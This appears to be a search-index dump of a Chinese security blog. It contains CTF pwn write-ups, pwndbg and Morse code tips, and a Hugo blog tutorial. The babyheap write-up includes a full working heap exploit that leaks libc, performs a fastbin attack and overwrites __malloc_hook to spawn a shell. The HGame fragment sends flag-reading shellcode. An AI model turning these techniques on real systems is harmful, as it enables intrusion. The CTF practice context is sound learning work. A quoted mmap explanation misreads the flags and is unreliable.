isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... payload = flat([ asm(\u0026#39;\u0026#39;\u0026#39; mov esi, edx xor edi, edi syscall \u0026#39;\u0026#39;\u0026#39;) ]) sendline_after_clean(payload) # 生成orw的shellcode payload = flat([ asm(\u0026#34;nop\u0026#34;)*0x10, asm(shellcraft.cat(\u0026#34;./flag\u0026#34;)) ]) sendline_after_clean(payload) interactive_after_clean() ","date":"2023年01月18日","permalink":"https://peterliuzhi.top/writeup/hgame-week1-pwn-writeup/","section":"writeup","summary":"The greatest healing therapy is friendship and love. — Hubert Humphrey test_nc nc连上远程直接cat flag easy_overflow checksec ida 简单的栈溢出，唯一需要注意的是在get shell前将标准输出流关掉了，但我们可以用shell命令","tags":["pwn","更改got表","orw","栈迁移","转移程序","nop滑板","shellcraft生成orw的shellcode"],"title":"HGame Week1 PWN WriteUp"},{"categories":["tricks"],"contents":" A man\u0026rsquo;s growth is seen in the successive choirs of his friends — Ralph Waldo Emerson\n问题 在使用pwntools调试程序的时候，在gdb窗口中使用pwndbg的特殊命令出现如下警告：\n按指示下载了相关的库之后警告却并没有消失，这实在是一件非常蛋疼的事情\n如果不能使用pwndbg相关命令，我们就只能用vmmap查看heap基址，然后用x一个一个chunk看，非常麻烦\n解决方法（大部分情况下） 在gdb窗口输入：\nset resolve-heap-via-heuristic on 这和我们用vmmap查看heap基址的原理一样，pwndbg会尝试通过这个基址计算出heap的信息，这不一定是对的，但至少在很多情况下能用\n原本没有这个功能，是一位大佬发现gef中没有调试符号也能正常使用，于是参考gef给pwndbg做了一个PR，详情见Heap inspection without libc debug symbols · Issue #937 · pwndbg/pwndbg · GitHub，感谢这位师傅\n","date":"2023年01月17日","permalink":"https://peterliuzhi.top/tricks/pwntools%E8%B0%83%E7%94%A8gdb%E8%B0%83%E8%AF%95%E6%97%B6%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8binsheap%E7%AD%89%E5%91%BD%E4%BB%A4/","section":"tricks","summary":"A man\u0026rsquo;s growth is seen in the successive choirs of his friends — Ralph Waldo Emerson 问题 在使用pwntools调试程序的时候，在gdb窗口中使用pwndbg的特殊命令出现如下警告： 按指示下载了相关的库之","tags":["pwn"],"title":"pwntools调用gdb调试时无法使用bins、heap等命令"},{"categories":["writeup"],"contents":" The best preparation for tomorrow is doing your best today. — H. Jackson Brown Jr.\n原题链接\nchecksec查看程序架构 ida查看伪C代码 典型菜单题，比较特殊的是，它使用了一个结构体数组，每个结构体内的content域中保存一个指向堆内存的指针\ninit_0函数 定义了一个整数变量 fd，一个字符指针变量 addr 以及一个无符号64位整型变量 v3。 使用 __readfsqword 指令从寄存器fs中读取 0x28 地址的值存入buf[3] 使用 setvbuf 函数将stdin和 _bss_start的缓存模式设置为2,即以行缓存的方式输入 使用alarm函数设置60秒超时 打印字符串 使用open打开/dev/urandom文件并赋值给fd 如果 fd \u0026lt; 0 或者 read(fd, buf, 0x10uLL) 返回值不为16,则终止程序 关闭文件 计算出一个地址addr,其值为(buf[9]. 然后计算一个变量v3. 使用mmap系统调用将addr开始的1k地址映射到内存，第三个参数为3，表示可读可写,第四个参数为34表示让系统自动选择内存地址，最后一个参数为0表示相对于起始地址，若映射不成功，退出程序。 返回 \u0026amp;addr[v3] 这段代码是在分配一个类似堆内存的内存区域，并返回这块内存的地址。通过使用/dev/urandom产生的随机数来进行内存地址的计算，来避免预测地址。\nmmap函数 mmap 是一个 C 库函数，用于在进程的虚拟地址空间中创建一段内存映射。\n该函数的原型为：\nvoid* mmap(void* addr, size_t length, int prot, int flags, int fd, off_t offset); 它有以下参数：\naddr：指定映射内存段的首地址。 length：指定映射内存段的大小。 prot：指定映射内存段的访问权限。 flags：指定映射内存段的其他特性。 fd：指定要映射的文件描述符。 offset：指定要映射的文件内存偏移量。 所以，mmap(addr, 0x1000uLL, 3, 34, -1, 0LL)的意思是：\n在进程的虚拟地址空间中创建一段大小为 0x1000 字节的内存映射。 这段内存映射的首地址为 addr。 这段内存映射的访问权限为可读写执行（即 3）。 这段内存映射的其他特性为共享内存（即 34）。 这段内存映射对应的文件描述符为 -1。 这段内存映射对应的文件内存偏移量为 0。 ✍️以上信息来源于chatgpt\n总之，它在防止我们拿到结构体的地址\nallocate 其中struc结构体为：\nchange 这个函数可以实现任意长度写，这样我们就可以修改任意chunk的size位\nremove free后置零，防止了UAF和double free\nshow 这里会打印出size个字符，不论是否是\\x00\n大致思路 利用任意长度写，实现chunk overlap后释放再分配，就得到了它所覆盖的chunk的随时可读权\n然后我们让它覆盖一个0x80的chunk，释放这个chunk后，我们就可以读到它fd指针内的main_arena地址，从而计算出libc基址\n然后我们再设计一个0x68大小的chunk，释放后用它上方的chunk的任意长度写更改其fd指针，这样我们就能实现fastbin attack，将其分配到__malloc_hook-0x23处（这是一个固定的漏洞地址），这样就可以绕过size位检查，更改__malloc_hook为one_gadget\n更多阅读：[BUUCTF]PWN——0ctf_2017_babyheap_Angel~Yan的博客-CSDN博客\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes from pymao import * pss: bool = False fn: str = \u0026#34;./0ctf_2017_babyheap\u0026#34; libc_name: str = \u0026#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_64.so\u0026#34; port: str = \u0026#34;25886\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None, drop_bound: bool = True) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if drop_bound else p.recvuntil(bound) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) if drop_bound else p.recvuntil(bound) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(size: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) # sendline_after_clean(str(index)) sendline_after_clean(str(size)) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) def show(index: int): sendline_after_clean(b\u0026#34;4\u0026#34;) sendline_after_clean(str(index)) def change(index: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) sendline_after_clean(str(len(content))) send_after_clean(content) allocate(0x10) # 0 allocate(0x10) # 1 allocate(0x80) # 2 allocate(0x30) # 3 allocate(0x68) # 4 allocate(0x10) # 5 # gdb.attach(p) payload = flat({0x10:[ pg(0), pg(0xB1) ]}) change(0, payload) # gdb.attach(p) remove(1) # -1 payload = flat([ pg(0)*3, pg(0x91) ]) allocate(0xA0) # 1 change(1, payload) remove(2) # -2 # gdb.attach(p) show(1) p.recvuntil(\u0026#34;Content: \\n\u0026#34;) p.recv(0x20) libc_addr = recv_and_transform() -0x3c4b78 hook_addr = libc_addr + libc.sym[\u0026#39;__malloc_hook\u0026#39;] chunk_addr = hook_addr - 0x23 one_gadget = libc_addr + 0x4526a suclog( \u0026#34;libc_addr\u0026#34;, \u0026#34;hook_addr\u0026#34;, \u0026#34;chunk_addr\u0026#34;, \u0026#34;one_gadget\u0026#34;, ) payload = flat([ pg(0)*7, pg(0x71), pg(chunk_addr) ]) remove(4) # -4 change(3, payload) allocate(0x68) # 2 allocate(0x68) # 4 payload = flat({(0x13):[ one_gadget ]}) change(4, payload) # gdb.attach(p) allocate(0x100) interactive_after_clean() ","date":"2023年01月09日","permalink":"https://peterliuzhi.top/writeup/0ctf_2017_babyheap/","section":"writeup","summary":"The best preparation for tomorrow is doing your best today. — H. Jackson Brown Jr. 原题链接 checksec查看程序架构 ida查看伪C代码 典型菜单题，比较特殊的是，它使用了一个结构体数组，每个结构体内的c","tags":["pwn","chunk overlap","fastbin attack","main_arena leak"],"title":"0ctf_2017_babyheap"},{"categories":["tricks"],"contents":" Strong beliefs win strong men, and then make them stronger. — Richard Bach\n从音频到英文单词 Morse Code Adaptive Audio Decoder | Morse Code World这个网站可以解析莫斯电码音频\n或者使用DataBorder Morse Code Sound \u0026amp; Vibration Listener，可以设置阈限值，可以识别出下划线（但是表示为#）\n解析摩斯电码音频需要用到AI（非AI需要手工调试阈限值），网站能搞就用网站搞吧，方便点\n从英文单词到摩斯电码 morse_code_dict = { \u0026#39;a\u0026#39;: \u0026#39;.-\u0026#39;, \u0026#39;b\u0026#39;: \u0026#39;-...\u0026#39;, \u0026#39;c\u0026#39;: \u0026#39;-.-.\u0026#39;, \u0026#39;d\u0026#39;: \u0026#39;-..\u0026#39;, \u0026#39;e\u0026#39;: \u0026#39;.\u0026#39;, \u0026#39;f\u0026#39;: \u0026#39;..-.\u0026#39;, \u0026#39;g\u0026#39;: \u0026#39;--.\u0026#39;, \u0026#39;h\u0026#39;: \u0026#39;....\u0026#39;, \u0026#39;i\u0026#39;: \u0026#39;..\u0026#39;, \u0026#39;j\u0026#39;: \u0026#39;.---\u0026#39;, \u0026#39;k\u0026#39;: \u0026#39;-.-\u0026#39;, \u0026#39;l\u0026#39;: \u0026#39;.-..\u0026#39;, \u0026#39;m\u0026#39;: \u0026#39;--\u0026#39;, \u0026#39;n\u0026#39;: \u0026#39;-.\u0026#39;, \u0026#39;o\u0026#39;: \u0026#39;---\u0026#39;, \u0026#39;p\u0026#39;: \u0026#39;.--.\u0026#39;, \u0026#39;q\u0026#39;: \u0026#39;--.-\u0026#39;, \u0026#39;r\u0026#39;: \u0026#39;.-.\u0026#39;, \u0026#39;s\u0026#39;: \u0026#39;...\u0026#39;, \u0026#39;t\u0026#39;: \u0026#39;-\u0026#39;, \u0026#39;u\u0026#39;: \u0026#39;..-\u0026#39;, \u0026#39;v\u0026#39;: \u0026#39;...-\u0026#39;, \u0026#39;w\u0026#39;: \u0026#39;.--\u0026#39;, \u0026#39;x\u0026#39;: \u0026#39;-..-\u0026#39;, \u0026#39;y\u0026#39;: \u0026#39;-.--\u0026#39;, \u0026#39;z\u0026#39;: \u0026#39;--..\u0026#39;, \u0026#39;0\u0026#39;: \u0026#39;-----\u0026#39;, \u0026#39;1\u0026#39;: \u0026#39;.----\u0026#39;, \u0026#39;2\u0026#39;: \u0026#39;..---\u0026#39;, \u0026#39;3\u0026#39;: \u0026#39;...--\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;....-\u0026#39;, \u0026#39;5\u0026#39;: \u0026#39;.....\u0026#39;, \u0026#39;6\u0026#39;: \u0026#39;-....\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;--...\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;---..\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;----.\u0026#39;, \u0026#39; \u0026#39;: \u0026#39;/\u0026#39; } def encode_morse(latin_string): ## 将拉丁文字符串转换为摩尔斯电码 morse_code = \u0026#39;\u0026#39; for char in latin_string: morse_code += morse_code_dict[char.lower()] + \u0026#39;/\u0026#39; return morse_code.strip() latin_string = \u0026#39;0 2 2 3 E P R I I B L Y H O N W A J M G H F G K C Q A O Q T M F R\u0026#39;.replace(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;) print(encode_morse(latin_string)) 也可以使用网站或者Best Morse Code Translator Online with Audio Play\n或者使用GitHub - HestStudio/MorseCoder: 一个关于摩斯密码解密与加密的库 / A library about encoding and decoding Morse code.\n相关阅读：\n利用python自动解析摩斯电码音频文件_Rabbit_Gray的博客-CSDN博客_如何从音频中提取摩斯密码 ","date":"2023年01月09日","permalink":"https://peterliuzhi.top/tricks/%E6%91%A9%E6%96%AF%E7%94%B5%E7%A0%81%E7%9A%84%E8%A7%A3%E7%A0%81/","section":"tricks","summary":"Strong beliefs win strong men, and then make them stronger. — Richard Bach 从音频到英文单词 Morse Code Adaptive Audio Decoder | Morse Code World这个网站可以解析莫斯电码音频 或者使用DataBorder Morse Code Sound \u0026amp; Vibration Listener","tags":["misc","morse"],"title":"摩斯电码的解码"},{"categories":["posts"],"contents":" Serious sport has nothing to do with fair play. It is bound up with hatred, jealousy, boastfulness, disregard of all rules and sadistic pleasure in witnessing violence. In other words, it is war minus the shooting. — George Orwell\n安装 hugo hugo 中文文档\n在releases 界面下载 hugo 的 exe 文件（windows可以使用choco安装），mac 用户可以使用brew install hugo\n如果要更新 hugo 的所有依赖库，使用命令go get -u -v github.com/gohugoio/hugo，注意，hugo 中文文档中给出的 GitHub 地址是已经过期的，运行后会叫你从这个地址下载（可以试试）\n使用 hugo 生成站点与文章，并在本地查看 使用命令hugo new site MyBlog生成一个博客文件夹\n使用命令hugo new posts\\intro.md，这个命令会在本来为空的 content 文件夹下新建 posts 文件夹，并在 posts 文件夹内新建 intro.md 文件。如果你不喜欢 posts 这个名字，也可以自定义。\n安装 hugo 主题，美化你的博客 hugo 有一个 themes 文件夹，使用cd themes进入该文件夹，在hugo 官方皮肤网站挑选一个喜欢的主题，使用 git 下载\n这里我使用的是wangchucheng提供的Eureka主题，页面简洁美观，有些功能很完善，但是有些功能没有，本教程会在后面说明增加方法\n请仔细阅读入门 - Hugo Eureka | WANG Chucheng下载安装该主题，本教程之后都是围绕该主题进行，如果你喜欢其他主题，可以查阅它的官方文档\n💡请阅读完主题文档再向下阅读，以下内容基本都是进阶内容\n使用 GitHub 的 pages 功能发布你的网页 这时候我们想看一下博客的效果，我们可以使用hugo -D server命令在本地查看。-D 选项默认在 public 文件夹生成页面，如果你想在 docs/文件夹生成页面，就使用hugo -d docs再hugo server\n这时候终端会蹦出一个类似//localhost:1313/的地址，在浏览器中输入该地址就能看到本地生成的博客啦\n如果想停止本地服务器就ctrl+c即可\n但是我们的博客不可能只给我们自己看啊，我们希望让互联网上的大家都看到。这时候我们有几个选择：\n购买自己的云服务器，价格比较昂贵，但是也有新人福利，能实现更多功能，酌情考虑 使用 GitHub 的 pages 服务，作者用的就是这个 使用 gitee 的 pages 服务，在国内会快一点，但是需要上传各种敏感信息，比如手持身份证照片，而且需要审核，酌情选择 注册 GitHub 账号 谷歌 GitHub 按指引注册即可\n创建一个新的仓库（repository） 仓库名最好是\u0026lt;你的用户名\u0026gt;.github.io，比如我就是 peterliu-all.github.io，如果不是这个名字可能会有一些未知的错误。\ndescription 随便写一下，一定要设置为 pubic，一开始先不要加别的文件（不要点下面的 add readme、license 等），让仓库为空\n然后复制一下仓库的 https 地址\n然后返回我们的终端，在你的博客根目录下输入hugo，这会忽略frontmatter标记draft: true，如果不想忽略草稿，就输入hugo -D\n然后我们进入 public 文件夹（或者你指定的生成页面的文件夹，比如 docs），输入下列命令：\ngit init \u0026lt;br\u0026gt; git remote add origin \u0026lt;你复制的github给的https链接\u0026gt; git add -A . git commit -m \u0026#34;first commit\u0026#34; git push -u origin master 然后等一会（可以进入仓库-\u0026gt;action 查看进度）就进入我们的仓库-\u0026gt;settings-\u0026gt;pages 就可以看到我们的页面网址是https://\u0026lt;用户名\u0026gt;.github.io/啦\n在它build完前查看或者build完马上查看可能会出现无样式的情况\n自动build后上传脚本 将下面的命令保存为upload.ps1脚本（Windows 下的 powershell 使用）\n其中的python脚本见图片上传问题\n$others = $args[1..($args.Length - 1)] If ([String]::IsNullOrWhiteSpace($args[0])) { ## 这是作者自定义的预处理文章的python脚本 python dispose_image.py false } else { python dispose_image.py $args[0] } hugo -v --log cd public git add -A . If ([String]::IsNullOrWhiteSpace(\u0026#34;$others\u0026#34;)){ git commit -m \u0026#34;$(date)\u0026#34; } else { git commit -m \u0026#34;$others\u0026#34; } git push origin master cd .. 其中第一个命令行参数会传递给python脚本，值为true或false，具体见图片上传问题\n第二个参数就是git commit的更新信息\n以后就可以使用.\\upload.ps1 false \u0026quot;\u0026lt;更新message\u0026gt;\u0026quot;来上传啦\n其他平台可以使用upload.py：\nimport os import sys import time if len(sys.argv) \u0026lt; 2: os.system(\u0026#34;python dispose_image.py false\u0026#34;) else: os.system(f\u0026#34;python dispose_image.py {sys.argv[1]}\u0026#34;) os.system(\u0026#34;hugo -v --log\u0026#34;) os.chdir(\u0026#34;public\u0026#34;) os.system(\u0026#34;git add -A .\u0026#34;) if len(sys.argv) \u0026lt;= 2: os.system(f\u0026#39;git commit -m \u0026#34;{time.strftime(\u0026#34;%Y-%m-%dT%H:%M:%S+08:00\u0026#34;, time.localtime())}\u0026#34;\u0026#39;) else: os.system(f\u0026#39;git commit -m \u0026#34;{sys.argv[2:]}\u0026#34;\u0026#39;) os.system(\u0026#34;git push origin master\u0026#34;) 本地渲染我也写了一个脚本，名为.\\local.ps1：\nIf ([String]::IsNullOrWhiteSpace($args[0])) { python dispose_image.py false } else { python dispose_image.py $args[0] } hugo -v --log hugo server --disableFastRender 使用方法是.\\local.ps1或.\\local.ps1 true来进行本地渲染了\n其他平台可以使用local.py：\nimport os import sys if len(sys.argv) \u0026lt; 2: os.system(\u0026#34;python dispose_image.py false\u0026#34;) else: os.system(f\u0026#34;python dispose_image.py {sys.argv[1]}\u0026#34;) os.system(\u0026#34;hugo -v --log\u0026#34;) try: os.system(\u0026#34;hugo server --disableFastRender\u0026#34;) except KeyboardInterrupt: print(\u0026#34;已退出\u0026#34;) except Exception as e: print(f\u0026#34;出现错误：{e}\u0026#34;) 图片上传问题 我们可以购买阿里云等服务供应商的图床服务（OSS服务），也可以使用GitHub保存图片\nEureka主题提供了一系列的上传图片的方法，详情见文档\n现在只需要知道两点：\n图片可以保存在/assets/images中，调用图片的时候markdown语法类似于![](/images/example.png) 图片可以保存在/content/image中，调用图片的时候markdown语法类似于![](/image/example.png) 总之存放图片/附件的文件夹在build的时候会被移动到根目录\n因此我们可以根据这点使用obsidian进行无缝衔接\n我们将仓库设在content文件夹，设置粘贴图片时的链接为相对仓库根目录的绝对路径：\n这样粘贴example.png的时候生成的图片链接就是![](image/example.png)，但是如果image前没有\u0026quot;/\u0026quot;，那么这个链接会被浏览器识别为相对链接，不会指向根目录下的image文件夹，如果手动更改为![](/image/example.png)，会发现obsidian和浏览器都能正确找到图片并展示，那么该怎么自动化实现这点呢？\n作者的方案是使用一个python脚本自动解析并替换所有的图片链接和附件链接，将下列代码保存为dispose_image.py并对上面给的代码中的python dispose_image.py取消注释\nimport re import os import sys from os.path import * redispose = False redispose = True if sys.argv[-1] == \u0026#34;true\u0026#34; else False ## 忽略的文件夹和文件名字，注意，只能识别路径中最后一个名字 ignore = [\u0026#34;image\u0026#34;, \u0026#34;model\u0026#34;, \u0026#34;archive\u0026#34;, \u0026#34;stats\u0026#34;, \u0026#34;search.md\u0026#34;, \u0026#34;Excalidraw\u0026#34;, \u0026#34;draw.io\u0026#34;, \u0026#34;appendix\u0026#34; \u0026#34;Chromium OS Docs - Linux System Call Table\u0026#34;, \u0026#34;subscribe\u0026#34;] ## image: True表示image文件夹是一个保存图片的文件夹，False表示保存附件 check_folder = {\u0026#34;image\u0026#34;: True, \u0026#34;appendix\u0026#34;: False} all_pat = {folder:re.compile(f\u0026#34;!\\[(.*)\\]\\({folder}(.*)\\)\u0026#34;) if jud else re.compile(f\u0026#34;\\[(.*)\\]\\({folder}(.*)\\)\u0026#34;) for folder, jud in check_folder.items()} ## D:\\database_BooksAndFiles\\Blog\\fnlblog\\test\\test.md ## 递归地处理文件夹下的内容，包括子文件夹的内容 def dispose(folder: str): global ignore dirs = os.listdir(folder) for file in dirs: if not (file.startswith(\u0026#34;.\u0026#34;) or file in ignore): print(f\u0026#34;[+]{file}\u0026#34;) fullpath = join(abspath(folder), file) if isfile(fullpath) and splitext(file)[1].strip(\u0026#34; \\n\u0026#34;) == \u0026#34;.md\u0026#34;: lines = [] flag = True start = 0 font_matter: int = 0 with open(fullpath, \u0026#34;r\u0026#34;, encoding=\u0026#34;UTF-8\u0026#34;) as f: for i, line in enumerate(f.readlines()): if line.strip(\u0026#34;\\n\u0026#34;).strip() == \u0026#34;---\u0026#34;: if font_matter == 0: font_matter = 1 start = i elif font_matter == 1: font_matter = 2 elif font_matter == 1 and not redispose: opt = line.split(\u0026#34;:\u0026#34;) if opt[0].strip() == \u0026#34;dispose\u0026#34; and \u0026#34;true\u0026#34; in opt[1]: ## 如果frontmatter中存在dispose: true，那么就不处理该文件 flag = False print(\u0026#34;dispose=True，已经过处理\u0026#34;) break elif font_matter == 2: for fd, pat in all_pat.items(): for match in pat.finditer(line): line = pat.sub( f\u0026#34;![{match.group(1)}](/{fd}{match.group(2)})\u0026#34;, line) \\ if check_folder[fd] == True \\ else f\u0026#34;[{match.group(1)}](/{fd}{match.group(2)})\u0026#34; print(line, end= \u0026#34;\u0026#34; if line.endswith(\u0026#34;\\n\u0026#34;) else \u0026#34;\\n\u0026#34;) lines.append(line) if flag and len(lines) \u0026gt; 0: with open(fullpath, \u0026#34;w\u0026#34;, encoding=\u0026#34;UTF-8\u0026#34;) as f: f.writelines(lines[:start+1]) if not redispose: ## 处理过的文件会在frontmatter中加上dispose: true f.write(\u0026#34;dispose: true\\n\u0026#34;) f.writelines(lines[start+1:]) elif isdir(fullpath): dispose(join(folder, file)) dispose(\u0026#34;content\u0026#34;) 这个脚本会解析它的命令行参数，如果传入sys.argv[1] == \u0026quot;true\u0026quot;，那么它就不会管frontmatter中dispose: true项，一视同仁地对所有文件进行解析，但这可能会浪费时间，所以建议传入false或者什么都不传入，这样程序会不解析frontmatter中有dispose: true项的文件\nfontawesome小插图无法显示的问题 